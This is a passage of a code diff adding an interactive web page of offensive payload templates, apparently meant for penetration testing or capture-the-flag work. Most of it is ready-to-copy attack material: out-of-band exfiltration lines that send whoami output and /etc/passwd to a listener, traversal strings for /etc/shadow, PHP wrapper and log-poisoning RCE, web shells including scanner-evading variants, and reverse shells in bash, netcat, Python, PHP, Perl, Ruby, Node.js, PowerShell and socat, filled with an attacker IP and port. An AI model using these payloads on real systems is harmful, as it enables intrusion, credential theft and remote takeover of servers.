+        notes: 'Measure HTTP response delay. If response takes 10+ seconds, command injection is confirmed.',
+        tags: ['blind', 'sleep', 'time-based', 'ping']
+      },
+      {
+        id: 'cmdi-blind-oob',
+        category: 'cmdi',
+        categoryName: 'Command Injection',
+        badge: 'OUT-OF-BAND',
+        badgeColor: 'secondary',
+        title: 'Out-of-Band (OOB) Data Exfiltration via HTTP / DNS',
+        description: 'Exfiltrate command output from blind injection targets directly to an attacker-controlled listener.',
+        payloadTemplate: 'curl http://[IP]:[PORT]/$(whoami)\nwget http://[IP]:[PORT]/$(whoami)\ncurl -X POST -d @/etc/passwd http://[IP]:[PORT]/\nping -c 1 [IP]',
+        notes: 'The victim executes the subshell $(whoami) and transmits the result as the HTTP path to your listener.',
+        tags: ['oob', 'exfiltration', 'curl', 'wget', 'dns']
+      },
+
+      // -----------------------------------------------------------------------
+      // LOCAL FILE INCLUSION (LFI) & PATH TRAVERSAL
+      // -----------------------------------------------------------------------
+      {
+        id: 'lfi-basic-traversal',
+        category: 'lfi',
+        categoryName: 'Local File Inclusion',
+        badge: 'TRAVERSAL',
+        badgeColor: 'primary',
+        title: 'Directory Traversal Relative Paths',
+        description: 'Standard traversal sequences to break out of application document roots and read sensitive OS files.',
+        payloadTemplate: '../../../../etc/passwd\n../../../../../../../../etc/shadow\n../../../../../../../../etc/hosts\n..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini',
+        notes: 'Use 8 to 12 traversal pairs to safely traverse from any subfolder up to the root directory.',
+        tags: ['lfi', 'traversal', 'passwd', 'windows']
+      },
+      {
+        id: 'lfi-url-encoded',
+        category: 'lfi',
+        categoryName: 'Local File Inclusion',
+        badge: 'URL ENCODED',
+        badgeColor: 'secondary',
+        title: 'URL & Double URL Encoded Traversal (%2e%2e%2f)',
+        description: 'Bypass basic WAF string matchers that look for literal ../ sequences.',
+        payloadTemplate: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\n%252e%252e%252f%252e%252e%252fetc%252fpasswd\n..%c0%af..%c0%af..%c0%afetc/passwd',
+        notes: 'Double encoding (%252e) defeats reverse proxies that decode once before passing to an internal server that decodes a second time.',
+        tags: ['url-encode', 'double-encode', 'bypass', 'lfi']
+      },
+      {
+        id: 'lfi-non-recursive',
+        category: 'lfi',
+        categoryName: 'Local File Inclusion',
+        badge: 'STRIP BYPASS',
+        badgeColor: 'warning',
+        title: 'Non-Recursive Filter Bypass (....//....//)',
+        description: 'Bypass flawed sanitization functions that remove ../ only once without recursive replacement.',
+        payloadTemplate: '....//....//....//....//etc/passwd\n....\\/....\\/....\\/....\\/etc/passwd\n..././..././..././etc/passwd',
+        notes: 'When the regex replaces ../ with an empty string, ....// collapses back into ../, successfully forming the traversal path.',
+        tags: ['strip', 'sanitization', 'bypass', 'lfi']
+      },
+      {
+        id: 'lfi-null-byte',
+        category: 'lfi',
+        categoryName: 'Local File Inclusion',
+        badge: 'NULL BYTE',
+        badgeColor: 'danger-critical',
+        title: 'Null Byte Injection (%00) Extension Bypass',
+        description: 'Terminate file path strings in legacy PHP (< 5.3.4) to bypass hardcoded extensions like .php.',
+        payloadTemplate: '../../../../etc/passwd%00\n../../../../etc/passwd%00.php\n../../../../etc/shadow%00.html',
+        notes: 'C-level string functions terminate at null byte \\0, discarding any extension appended by the backend script.',
+        tags: ['null-byte', 'extension', 'php-legacy', 'lfi']
+      },
+      {
+        id: 'lfi-wrapper-base64',
+        category: 'lfi',
+        categoryName: 'PHP Wrappers',
+        badge: 'SOURCE DISCLOSURE',
+        badgeColor: 'primary',
+        title: 'PHP Filter Wrapper Base64 Source Disclosure',
+        description: 'Read backend PHP source code files without server-side execution via base64 stream filter.',
+        payloadTemplate: 'php://filter/convert.base64-encode/resource=index.php\nphp://filter/convert.base64-encode/resource=config.php\nphp://filter/read=convert.base64-encode/resource=db.php',
+        notes: 'PHP encodes the source file before rendering, allowing you to extract credentials, database passwords, and API keys.',
+        tags: ['wrapper', 'filter', 'base64', 'source-leak', 'php']
+      },
+      {
+        id: 'lfi-wrapper-input',
+        category: 'lfi',
+        categoryName: 'PHP Wrappers',
+        badge: 'RCE VIA WRAPPER',
+        badgeColor: 'danger-critical',
+        title: 'PHP Input Wrapper Code Execution (php://input)',
+        description: 'Execute arbitrary PHP code sent via POST raw request body through the php://input stream.',
+        payloadTemplate: 'GET: ?page=php://input&cmd=id\nPOST BODY: <?php system($_GET[\'cmd\']); ?>\n\ncurl -X POST "http://target/index.php?page=php://input&cmd=id" -d "<?php system(\$_GET[\'cmd\']); ?>"',
+        notes: 'Requires allow_url_include=On in php.ini. Provides instant RCE without writing files to disk.',
+        tags: ['input-wrapper', 'rce', 'post-stream', 'php']
+      },
+      {
+        id: 'lfi-wrapper-data',
+        category: 'lfi',
+        categoryName: 'PHP Wrappers',
+        badge: 'DATA URI RCE',
+        badgeColor: 'secondary',
+        title: 'Data URI Plaintext / Base64 Wrapper (data://)',
+        description: 'Inject inline PHP code directly inside the inclusion URL parameter.',
+        payloadTemplate: 'data://text/plain,<?php system($_GET[\'cmd\']); ?>&cmd=id\ndata://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=id',
+        notes: 'Requires allow_url_include=On. The base64 string decodes to <?php system($_GET[\'cmd\']); ?>.',
+        tags: ['data-uri', 'inline', 'base64', 'wrapper', 'rce']
+      },
+
+      // -----------------------------------------------------------------------
+      // LFI TO RCE & LOG POISONING
+      // -----------------------------------------------------------------------
+      {
+        id: 'poison-apache-log',
+        category: 'poison',
+        categoryName: 'Log Poisoning',
+        badge: 'APACHE LOG',
+        badgeColor: 'warning',
+        title: 'Apache Access Log Poisoning (User-Agent)',
+        description: 'Inject PHP web shell into Apache access logs, then execute it via LFI inclusion.',
+        payloadTemplate: 'STEP 1 (Poison User-Agent):\ncurl -A "<?php system(\\$_GET[\'cmd\']); ?>" "http://target/index.php"\n\nSTEP 2 (Include Log & Execute):\nhttp://target/index.php?page=/var/log/apache2/access.log&cmd=id',
+        notes: 'Do not trigger a syntax error in your PHP snippet, otherwise the entire log file may error out on inclusion.',
+        tags: ['log-poisoning', 'apache', 'user-agent', 'access-log']
+      },
+      {
+        id: 'poison-ssh-log',
+        category: 'poison',
+        categoryName: 'Log Poisoning',
+        badge: 'SSH AUTH LOG',
+        badgeColor: 'danger-critical',
+        title: 'SSH Auth Log Poisoning (/var/log/auth.log)',
+        description: 'Attempt SSH authentication with a PHP one-liner as the username to poison /var/log/auth.log.',
+        payloadTemplate: 'STEP 1 (Poison Username):\nssh \'<?php system($_GET["cmd"]); ?>\'@target-ip\n(Enter any fake password when prompted)\n\nSTEP 2 (Include Auth Log):\nhttp://target/index.php?page=/var/log/auth.log&cmd=id',
+        notes: 'Requires read permissions on /var/log/auth.log. If successful, grants instant command execution.',
+        tags: ['ssh', 'auth-log', 'poisoning', 'rce']
+      },
+      {
+        id: 'poison-php-sessions',
+        category: 'poison',
+        categoryName: 'Log Poisoning',
+        badge: 'SESSION FILE',
+        badgeColor: 'primary',
+        title: 'PHP Session File Poisoning (/sess_[PHPSESSID])',
+        description: 'Poison a session variable stored on the server filesystem, then include the session file.',
+        payloadTemplate: 'STEP 1: Find Cookie PHPSESSID=h9f8d7g6...\nSTEP 2: Submit form input: <?php system($_GET[\'c\']); ?>\nSTEP 3: Include session file:\nhttp://target/index.php?page=/var/lib/php/sessions/sess_h9f8d7g6&c=id\n(Alt: /tmp/sess_h9f8d7g6)',
+        notes: 'PHP saves active session data in /var/lib/php/sessions/sess_[ID] or /tmp/sess_[ID].',
+        tags: ['session', 'phpsessid', 'poisoning', 'lfi']
+      },
+      {
+        id: 'poison-proc-environ',
+        category: 'poison',
+        categoryName: 'Log Poisoning',
+        badge: 'PROC ENVIRON',
+        badgeColor: 'secondary',
+        title: '/proc/self/environ Environmental Variable Poisoning',
+        description: 'Include the Linux kernel process environment file poisoned with a custom HTTP header.',
+        payloadTemplate: 'curl -H "User-Agent: <?php system($_GET[\'cmd\']); ?>" "http://target/index.php?page=/proc/self/environ&cmd=id"',
+        notes: 'Works on older Linux distributions where the web server process has read access to /proc/self/environ.',
+        tags: ['proc', 'environ', 'user-agent', 'kernel']
+      },
+
+      // -----------------------------------------------------------------------
+      // PHP WEB SHELLS & EXECUTION
+      // -----------------------------------------------------------------------
+      {
+        id: 'php-tiny-shell',
+        category: 'php',
+        categoryName: 'PHP Web Shells',
+        badge: 'TINY WEB SHELL',
+        badgeColor: 'primary',
+        title: 'Minimal One-Liner PHP Web Shells',
+        description: 'Ultra-compact PHP web shells for file upload exploitation, parameter injection, and backdoor access.',
+        payloadTemplate: '<?php system($_GET[\'cmd\']); ?>\n<?php passthru($_GET[\'c\']); ?>\n<?php echo shell_exec($_GET[\'cmd\']); ?>\n<?=`$_GET[0]`;\n<?php eval($_POST[\'code\']); ?>',
+        notes: '<?=`$_GET[0]`; is the shortest possible PHP shell utilizing short tags and shell execution backticks.',
+        tags: ['php', 'web-shell', 'one-liner', 'system', 'eval']
+      },
+      {
+        id: 'php-obfuscated-shell',
+        category: 'php',
+        categoryName: 'PHP Web Shells',
+        badge: 'OBFUSCATED',
+        badgeColor: 'secondary',
+        title: 'String Concatenation & Variable Function Evasion',
+        description: 'Evade antivirus and static code analysis scanners that flag literal "system(" or "eval(" strings.',
+        payloadTemplate: "<?php $f = 'sys'.'tem'; $f($_GET['cmd']); ?>\n<?php $a = 'shell_'.'exec'; echo $a($_GET['cmd']); ?>\n<?php $_GET['func']($_GET['arg']); ?>\n<?php uksort($_GET, 'system'); ?>",
+        notes: 'Passing ?whoami=1 to the uksort shell triggers system("whoami") without calling system directly in code.',
+        tags: ['obfuscated', 'evasion', 'av-bypass', 'php']
+      },
+      {
+        id: 'php-bypass-disable-functions',
+        category: 'php',
+        categoryName: 'PHP Web Shells',
+        badge: 'DISABLE_FUNCTIONS',
+        badgeColor: 'warning',
+        title: 'Bypass disable_functions via Proc_Open / Popen',
+        description: 'Alternative process execution functions when system(), exec(), and passthru() are disabled in php.ini.',
+        payloadTemplate: '<?php\n$p = proc_open($_GET[\'c\'], [0=>["pipe","r"],1=>["pipe","w"],2=>["pipe","w"]], $pipes);\necho stream_get_contents($pipes[1]);\nproc_close($p);\n?>\n\n<?php\n$p = popen($_GET[\'c\'], "r");\nwhile(!feof($p)) { echo fgets($p, 1024); }\npclose($p);\n?>',
+        notes: 'Sysadmins frequently disable system, exec, shell_exec, but overlook proc_open or popen.',
+        tags: ['disable_functions', 'proc_open', 'popen', 'php.ini']
+      },
+
+      // -----------------------------------------------------------------------
+      // REVERSE SHELLS (LINUX, BASH, NETCAT, LANGUAGES)
+      // -----------------------------------------------------------------------
+      {
+        id: 'rev-bash-tcp',
+        category: 'revshell',
+        categoryName: 'Reverse Shells',
+        badge: 'BASH TCP',
+        badgeColor: 'primary',
+        title: 'Standard Interactive Bash TCP Reverse Shell',
+        description: 'The most universal Linux reverse shell one-liner using bash /dev/tcp virtual file descriptors.',
+        payloadTemplate: 'bash -i >& /dev/tcp/[IP]/[PORT] 0>&1\n/bin/bash -c "bash -i >& /dev/tcp/[IP]/[PORT] 0>&1"\n0<&196;exec 196<>/dev/tcp/[IP]/[PORT]; sh <&196 >&196 2>&196',
+        notes: 'Requires native bash. If sh is invoked, wrap with /bin/bash -c "..." to ensure /dev/tcp parser is active.',
+        tags: ['bash', 'tcp', 'reverse-shell', 'dev-tcp', 'linux']
+      },
+      {
+        id: 'rev-netcat-fifo',
+        category: 'revshell',
+        categoryName: 'Reverse Shells',
+        badge: 'NETCAT FIFO',
+        badgeColor: 'secondary',
+        title: 'Netcat Without -e (OpenBSD FIFO Named Pipe)',
+        description: 'Reliable netcat reverse shell when the traditional -e execution flag is stripped for security.',
+        payloadTemplate: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IP] [PORT] >/tmp/f\nrm -f /tmp/p; mknod /tmp/p p && nc [IP] [PORT] 0</tmp/p | /bin/sh 1>/tmp/p',
+        notes: 'Standard Kali/Ubuntu/Debian netcat lacks the -e option. Creating a FIFO named pipe routes I/O cleanly.',
+        tags: ['nc', 'netcat', 'fifo', 'mkfifo', 'openbsd']
+      },
+      {
+        id: 'rev-netcat-e',
+        category: 'revshell',
+        categoryName: 'Reverse Shells',
+        badge: 'NETCAT -E',
+        badgeColor: 'primary',
+        title: 'Netcat Traditional with -e / -c Execution Flag',
+        description: 'Direct shell spawning with traditional netcat (nc.traditional) or busybox netcat.',
+        payloadTemplate: 'nc -e /bin/bash [IP] [PORT]\nnc -e /bin/sh [IP] [PORT]\nnc -c /bin/sh [IP] [PORT]\nbusybox nc [IP] [PORT] -e /bin/sh',
+        notes: 'Always check if traditional netcat exists at /bin/nc.traditional or busybox.',
+        tags: ['netcat', 'nc', 'traditional', 'busybox']
+      },
+      {
+        id: 'rev-python3',
+        category: 'revshell',
+        categoryName: 'Reverse Shells',
+        badge: 'PYTHON 3',
+        badgeColor: 'warning',
+        title: 'Python 3 Interactive PTY Reverse Shell',
+        description: 'Full interactive socket connection spawning an authenticated PTY pseudo-terminal.',
+        payloadTemplate: 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[IP]",[PORT]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")\'',
+        notes: 'Spawns an interactive PTY immediately upon connection, eliminating the need to stabilize raw dumb shells.',
+        tags: ['python', 'python3', 'pty', 'socket', 'linux']
+      },
+      {
+        id: 'rev-php-cli',
+        category: 'revshell',
+        categoryName: 'Reverse Shells',
+        badge: 'PHP CLI',
+        badgeColor: 'primary',
+        title: 'PHP CLI One-Liner Reverse Shell',
+        description: 'Spawns a shell using the PHP CLI binary or inside command injection vulnerabilities on web servers.',
+        payloadTemplate: 'php -r \'$sock=fsockopen("[IP]",[PORT]);exec("/bin/sh -i <&3 >&3 2>&3");\'\nphp -r \'$sock=fsockopen("[IP]",[PORT]);$proc=proc_open("/bin/sh -i",[0=>$sock,1=>$sock,2=>$sock],$pipes);\'',
+        notes: 'Works on almost all Apache/Nginx web servers where PHP is installed and shell_exec/exec is allowed.',
+        tags: ['php', 'cli', 'fsockopen', 'proc_open']
+      },
+      {
+        id: 'rev-socat',
+        category: 'revshell',
+        categoryName: 'Reverse Shells',
+        badge: 'SOCAT TTY',
+        badgeColor: 'danger-critical',
+        title: 'Socat Fully Interactive PTY Reverse Shell',
+        description: 'Drop directly into a complete TTY shell with job control, Ctrl+C handling, and window resizing.',
+        payloadTemplate: 'socat TCP:[IP]:[PORT] EXEC:"/bin/bash",pty,stderr,setsid,sigint,sane\nsocat TCP:[IP]:[PORT] EXEC:/bin/sh',
+        notes: 'Connects to an active listener: socat file:`tty`,raw,echo=0 TCP-L:[PORT]. Gives an instant root-quality shell.',
+        tags: ['socat', 'pty', 'fully-interactive', 'sigint']
+      },
+      {
+        id: 'rev-perl',
+        category: 'revshell',
+        categoryName: 'Reverse Shells',
+        badge: 'PERL',
+        badgeColor: 'secondary',
+        title: 'Perl Socket Reverse Shell',
+        description: 'Reliable reverse shell on legacy Unix and Linux installations with Perl installed.',
+        payloadTemplate: 'perl -e \'use Socket;$i="[IP]";$p=[PORT];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'',
+        notes: 'Perl is pre-installed on virtually all base Linux distributions and often bypasses python-specific audit rules.',
+        tags: ['perl', 'socket', 'unix', 'legacy']
+      },
+      {
+        id: 'rev-ruby',
+        category: 'revshell',
+        categoryName: 'Reverse Shells',
+        badge: 'RUBY',
+        badgeColor: 'warning',
+        title: 'Ruby TCP Socket Spawn One-Liner',
+        description: 'Short and reliable reverse shell for servers hosting Ruby on Rails applications.',
+        payloadTemplate: 'ruby -rsocket -e\'spawn("sh",[:in,:out,:err]=>TCPSocket.new("[IP]",[PORT]))\'\nruby -rsocket -e\'f=TCPSocket.open("[IP]",[PORT]).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
+        notes: 'The spawn syntax maps stdin, stdout, and stderr directly to the open TCPSocket stream.',
+        tags: ['ruby', 'rails', 'socket', 'spawn']
+      },
+      {
+        id: 'rev-nodejs',
+        category: 'revshell',
+        categoryName: 'Reverse Shells',
+        badge: 'NODE.JS',
+        badgeColor: 'primary',
+        title: 'Node.js Child Process Reverse Shell',
+        description: 'Reverse shell payload for Express.js / Node.js web applications and RCE endpoints.',
+        payloadTemplate: 'node -e \'const net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []); const client = new net.Socket(); client.connect([PORT], "[IP]", () => { client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); });\'',
+        notes: 'Pipes the spawned shell stream directly to the TCP socket stream.',
+        tags: ['node', 'nodejs', 'javascript', 'child_process']
+      },
+      {
+        id: 'rev-powershell-tcp',
+        category: 'revshell',
+        categoryName: 'Reverse Shells',
+        badge: 'POWERSHELL',
+        badgeColor: 'secondary',
+        title: 'Windows PowerShell TCP Reverse Shell',
+        description: 'Native PowerShell reverse shell one-liner executing without writing temporary files to disk.',
+        payloadTemplate: 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("[IP]",[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()',
+        notes: 'Executes entirely in RAM. Can be Base64-encoded with UTF-16LE for powershell.exe -enc.',
+        tags: ['powershell', 'windows', 'tcp', 'in-memory']
+      },
+
+      // -----------------------------------------------------------------------
+      // TTY SHELL STABILIZATION & UPGRADES
+      // -----------------------------------------------------------------------
+      {
+        id: 'tty-python-pty',
+        category: 'tty',
+        categoryName: 'TTY Stabilization',
+        badge: 'PYTHON PTY',
+        badgeColor: 'primary',
+        title: 'Full PTY Shell Stabilization via Python (Step-by-Step)',
+        description: 'Transform a dumb netcat shell into a fully interactive terminal with tab completion, Ctrl+C handling, and clear screen.',
+        payloadTemplate: 'STEP 1 (Inside target shell):\npython3 -c \'import pty; pty.spawn("/bin/bash")\'\n\nSTEP 2 (Background with keyboard):\nPress [Ctrl + Z]\n\nSTEP 3 (In your local terminal):\nstty raw -echo; fg\n(Press [ENTER] twice)\n\nSTEP 4 (Set terminal rows & cols):\nexport TERM=xterm-256color\nstty rows 38 cols 116',
+        notes: 'Query your local terminal geometry using "stty size" before setting rows and cols on the victim.',
+        tags: ['tty', 'pty', 'stty', 'python', 'stabilization']
+      },
+      {
+        id: 'tty-script-util',
+        category: 'tty',
+        categoryName: 'TTY Stabilization',
+        badge: 'SCRIPT UTILITY',
+        badgeColor: 'secondary',
+        title: 'PTY Allocation via /usr/bin/script',
+        description: 'Stabilize shells when Python is not installed on the victim machine using the native BSD script binary.',
+        payloadTemplate: '/usr/bin/script -qc /bin/bash /dev/null\n\n(Then background with Ctrl+Z and run: stty raw -echo; fg)',
+        notes: 'The -qc flag tells script to run quietly and execute /bin/bash without writing a typescript log file.',
+        tags: ['script', 'tty', 'pty', 'no-python']
+      }
+    ];
+
+    // =========================================================================
+    // 2. RENDERING & DYNAMIC SUBSTITUTION ENGINE
+    // =========================================================================
+    const grid = document.getElementById('payloads-grid');
+    const lhostInput = document.getElementById('config-lhost');
+    const lportInput = document.getElementById('config-lport');
+    const shellSelect = document.getElementById('config-shell');
+    const searchInput = document.getElementById('payload-search');
+    const clearSearchBtn = document.getElementById('clear-search-btn');
+    const categoryChips = document.querySelectorAll('.cat-pill');
+    const emptyState = document.getElementById('empty-state');
+    const filterFeedback = document.getElementById('filter-feedback');
+    const visibleCountEl = document.getElementById('visible-count');
+    const displayNcListener = document.getElementById('display-nc-listener');
+
+    let currentCategory = 'all';
+    let searchQuery = '';
+
+    function escapeHtml(str) {
+      if (!str) return '';
+      return String(str)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;')
+        .replace(/'/g, '&#039;');
+    }
+
+    function getReplacedPayload(template) {
+      const lhost = lhostInput.value.trim() || '10.10.14.23';
+      const lport = lportInput.value.trim() || '4444';
+      const shell = shellSelect.value || '/bin/bash';
+
+      // Generate replacement for Base64 reverse shell
+      const rawRev = `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
+      let b64Rev = '';
+      try {
+        b64Rev = btoa(rawRev);
+      } catch (e) {
+        b64Rev = 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMy80NDQ0IDA+JjE=';
+      }
+
+      return template
+        .replace(/\[IP\]/g, lhost)
+        .replace(/\[PORT\]/g, lport)
+        .replace(/\/bin\/bash/g, shell)
+        .replace(/\[BASE64_REV\]/g, b64Rev);
+    }
+
+    function renderCards() {
+      const q = searchQuery.toLowerCase().trim();
+      let visibleCount = 0;
+
+      grid.innerHTML = '';
+
+      PAYLOADS.forEach((item, idx) => {
+        const matchesCategory = currentCategory === 'all' || item.category === currentCategory;
+        const matchesSearch = !q || 
+                              item.title.toLowerCase().includes(q) || 
+                              item.description.toLowerCase().includes(q) || 
+                              item.tags.some(t => t.toLowerCase().includes(q)) ||
+                              item.payloadTemplate.toLowerCase().includes(q);
+
+        if (!matchesCategory || !matchesSearch) return;
+
+        visibleCount++;
+        const replacedCode = getReplacedPayload(item.payloadTemplate);
+
+        const badgeColorClasses = {
+          'primary': 'text-primary border-primary/40 bg-primary/10',
+          'secondary': 'text-secondary border-secondary/40 bg-secondary/10',
+          'warning': 'text-warning border-warning/40 bg-warning/10',
+          'danger-critical': 'text-danger-critical border-danger-critical/40 bg-danger-critical/10',
+        }[item.badgeColor] || 'text-primary border-primary/40 bg-primary/10';
+
+        const card = document.createElement('div');
+        card.className = 'p-4 sm:p-5 rounded-2xl bg-surface-subtle border border-border-hairline hover:border-primary/40 transition-all flex flex-col justify-between space-y-3 group shadow-[0_4px_25px_rgba(0,0,0,0.5)]';
+        card.setAttribute('data-id', item.id);
+
+        card.innerHTML = `
+          <!-- Header Row -->
+          <div class="space-y-1.5">
+            <div class="flex items-center justify-between gap-2 flex-wrap">
+              <span class="px-2 py-0.5 rounded border text-[10px] font-mono font-bold uppercase tracking-wider ${badgeColorClasses}">
+                ${item.badge}
+              </span>
+              <span class="text-[10px] font-mono text-outline uppercase">${item.categoryName}</span>
+            </div>
+            <h3 class="text-sm font-bold text-on-surface group-hover:text-primary transition-colors flex items-center gap-1.5">
+              <span>${item.title}</span>
+            </h3>
+            <p class="text-xs text-outline leading-relaxed">${item.description}</p>
+          </div>
+
+          <!-- Code Box -->
+          <div class="space-y-1.5">
+            <div class="relative rounded-xl bg-canvas-base border border-border-hairline/80 overflow-hidden group/code">
+              <pre class="p-3 text-[11px] font-mono text-on-surface whitespace-pre-wrap break-all overflow-x-auto leading-relaxed max-h-48 selection:bg-primary selection:text-canvas-base"><code>${escapeHtml(replacedCode)}</code></pre>
+            </div>
+          </div>
+
+          <!-- Action Buttons Bar -->
+          <div class="pt-2 border-t border-border-hairline/60 flex items-center justify-between gap-2 flex-wrap text-xs font-mono">
+            <div class="flex items-center gap-1.5">
+              <button class="copy-btn px-2.5 py-1 rounded bg-primary/10 border border-primary/40 hover:bg-primary hover:text-canvas-base text-primary font-bold transition-all flex items-center gap-1 cursor-pointer"
+                      data-payload="${escapeHtml(replacedCode)}" title="Copy raw payload to clipboard">
+                <span class="material-symbols-outlined text-xs">content_copy</span>
+                <span>Copy</span>
+              </button>
+              <button class="copy-url-btn px-2.5 py-1 rounded bg-surface-raised border border-border-hairline hover:border-secondary hover:text-secondary text-outline transition-all flex items-center gap-1 cursor-pointer"
+                      data-payload="${escapeHtml(replacedCode)}" title="Copy URL-encoded payload">
+                <span>URL Enc</span>
+              </button>
+              <button class="copy-b64-btn px-2.5 py-1 rounded bg-surface-raised border border-border-hairline hover:border-primary hover:text-primary text-outline transition-all flex items-center gap-1 cursor-pointer"
+                      data-payload="${escapeHtml(replacedCode)}" title="Copy Base64-encoded payload">
+                <span>Base64</span>
+              </button>
+            </div>
+
+            <!-- Notes Accordion Toggle -->
+            ${item.notes ? `
+              <details class="group/note">
+                <summary class="text-[11px] text-outline hover:text-secondary cursor-pointer list-none flex items-center gap-1 select-none">
+                  <span class="material-symbols-outlined text-xs">info</span>
+                  <span>Notes</span>
+                </summary>
+                <div class="mt-2 p-2.5 rounded-lg bg-surface-raised border border-border-hairline text-[11px] text-on-surface-variant font-mono leading-relaxed">
+                  <span class="text-primary font-bold">TIP:</span> ${escapeHtml(item.notes)}
+                </div>
+              </details>
+            ` : ''}
+          </div>
+        `;
+
+        grid.appendChild(card);
+      });
+
+      // Update Visibility Counter
+      visibleCountEl.textContent = visibleCount;
+      if (visibleCount === 0) {
+        emptyState.classList.remove('hidden');
+        filterFeedback.classList.add('hidden');
+      } else {
+        emptyState.classList.add('hidden');
+        if (q || currentCategory !== 'all') {
+          filterFeedback.classList.remove('hidden');
+          filterFeedback.classList.add('flex');
+        } else {
+          filterFeedback.classList.add('hidden');
+          filterFeedback.classList.remove('flex');
+        }
+      }
+
+      // Attach Copy Listeners
+      grid.querySelectorAll('.copy-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+          const txt = btn.getAttribute('data-payload');
+          copyToClipboard(txt, 'Payload copied to clipboard!');
+        });
+      });
+
+      grid.querySelectorAll('.copy-url-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+          const txt = btn.getAttribute('data-payload');
+          const enc = encodeURIComponent(txt);
+          copyToClipboard(enc, 'URL-encoded payload copied!');
+        });
+      });
+
+      grid.querySelectorAll('.copy-b64-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+          const txt = btn.getAttribute('data-payload');
+          let enc = '';
+          try {
+            enc = btoa(txt);
+          } catch(e) {
+            enc = btoa(unescape(encodeURIComponent(txt)));
+          }
+          copyToClipboard(enc, 'Base64 payload copied!');
+        });
+      });
+    }
+
+    // =========================================================================
+    // 3. COPY HELPER & TOAST NOTIFICATION
+    // =========================================================================
+    function copyToClipboard(text, message = 'Copied to clipboard!') {
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(text).then(() => showToast(message, 'success'));
+      } else {
+        const ta = document.createElement('textarea');
+        ta.value = text;
+        ta.style.position = 'fixed';
+        ta.style.opacity = '0';
+        document.body.appendChild(ta);
+        ta.select();
+        document.execCommand('copy');
+        ta.remove();
+        showToast(message, 'success');
+      }
+    }
+
+    function showToast(message, type = 'success') {
+      const container = document.getElementById('toast-container');
+      const toast = document.createElement('div');
+      toast.className = 'px-4 py-2.5 rounded-xl bg-surface-raised border border-primary/40 shadow-[0_8px_30px_rgba(0,0,0,0.7)] text-xs font-mono font-bold text-primary flex items-center gap-2 transform translate-y-3 opacity-0 transition-all duration-300 pointer-events-auto';
+      toast.innerHTML = `<span class="material-symbols-outlined text-sm">check_circle</span><span>${escapeHtml(message)}</span>`;
+      container.appendChild(toast);
+
+      requestAnimationFrame(() => {
+        toast.classList.remove('translate-y-3', 'opacity-0');
+      });
+
+      setTimeout(() => {
+        toast.classList.add('translate-y-3', 'opacity-0');
+        setTimeout(() => toast.remove(), 300);
+      }, 2500);
+    }
+
+    // =========================================================================
+    // 4. CONFIGURATION UPDATE LISTENER
+    // =========================================================================
+    function updateConfig() {
+      const lport = lportInput.value.trim() || '4444';
+      displayNcListener.textContent = `nc -lvnp ${lport}`;
+
+      // Update static stagers in page
+      document.querySelectorAll('.dynamic-cmd').forEach(el => {
+        const lhost = lhostInput.value.trim() || '10.10.14.23';
+        const lport = lportInput.value.trim() || '4444';
+        el.textContent = el.textContent
+          .replace(/\[PORT\]/g, lport)
+          .replace(/\[IP\]/g, lhost);
+      });
+
+      renderCards();
+      updateEncoderOutput();
+    }
+
+    lhostInput.addEventListener('input', updateConfig);
+    lportInput.addEventListener('input', updateConfig);
+    shellSelect.addEventListener('change', updateConfig);
+
+    document.getElementById('reset-config-btn').addEventListener('click', () => {
+      lhostInput.value = '10.10.14.23';
+      lportInput.value = '4444';
+      shellSelect.value = '/bin/bash';
+      updateConfig();
+      showToast('Configuration reset to defaults');
+    });
+
+    document.getElementById('copy-nc-listener').addEventListener('click', () => {
+      copyToClipboard(displayNcListener.textContent, 'Listener command copied!');
+    });
+
+    // =========================================================================
+    // 5. SEARCH & CATEGORY FILTERING
+    // =========================================================================
+    searchInput.addEventListener('input', (e) => {
+      searchQuery = e.target.value;
+      if (searchQuery) {
+        clearSearchBtn.classList.remove('hidden');
+      } else {
+        clearSearchBtn.classList.add('hidden');
+      }
+      renderCards();
+    });
+
+    clearSearchBtn.addEventListener('click', () => {
+      searchInput.value = '';
+      searchQuery = '';
+      clearSearchBtn.classList.add('hidden');
+      renderCards();
+    });
+
+    categoryChips.forEach(btn => {
+      btn.addEventListener('click', () => {
+        categoryChips.forEach(b => {
+          b.classList.remove('active', 'border-primary/50', 'bg-primary/20', 'text-primary');
+          b.classList.add('border-border-hairline', 'bg-surface-raised', 'text-on-surface-variant');
+        });
+        btn.classList.add('active', 'border-primary/50', 'bg-primary/20', 'text-primary');
+        btn.classList.remove('border-border-hairline', 'bg-surface-raised', 'text-on-surface-variant');
+
